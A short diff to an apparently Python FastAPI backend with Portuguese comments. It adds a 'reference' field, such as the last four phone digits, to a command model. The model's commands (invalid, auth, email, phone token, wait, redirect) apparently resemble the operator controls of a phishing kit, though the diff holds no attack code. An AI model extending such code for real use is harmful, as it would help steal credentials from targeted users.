@@ -88,6 +88,7 @@ class CommandRequest(BaseModel):
     user_id: str
     command: str  # "INV", "AUT", "EMAIL", "TOK-TEL", "TELEFONE", "AGUARDE", "REDIRECT"
     redirect_url: Optional[str] = None
+    reference: Optional[str] = None  # Campo de referência (ex: 4 últimos dígitos do telefone)
 
 # Helper Functions
 def create_access_token(data: dict):
